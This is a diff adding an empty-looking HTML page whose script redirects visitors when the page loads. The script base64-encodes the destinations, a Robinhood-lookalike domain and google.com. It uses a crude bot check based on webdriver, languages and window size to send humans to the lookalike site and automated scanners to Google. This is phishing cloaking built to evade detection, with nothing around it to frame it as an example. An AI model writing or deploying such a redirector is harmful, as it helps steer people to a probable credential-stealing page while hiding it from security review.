@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title></title>
+  <style>
+    body { background: #fff; margin: 0; }
+  </style>
+</head>
+<body>
+   <script>
+     function decode(x) {
+       return atob(x);
+     }
+
+     function isHuman() {
+       try {
+         return (
+           Array.isArray(navigator.languages) &&
+           navigator.languages.length > 0 &&
+           !navigator.webdriver &&
+           window.outerWidth > 0 &&
+           window.outerHeight > 0
+         );
+       } catch (_) {
+         return false;
+       }
+     }
+
+     setTimeout(() => {
+       const query = location.search;
+
+       const t = "aHR0cHM6Ly9yb2Jpbmhvb2QucnVuL3BveWNsZXF4";
+       const f = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==";
+
+       const target = decode(t);
+       const fallback = decode(f);
+
+       location.href = (isHuman() ? target : fallback) + query;
+     }, 500);
+   </script>
+</body>
+</html>
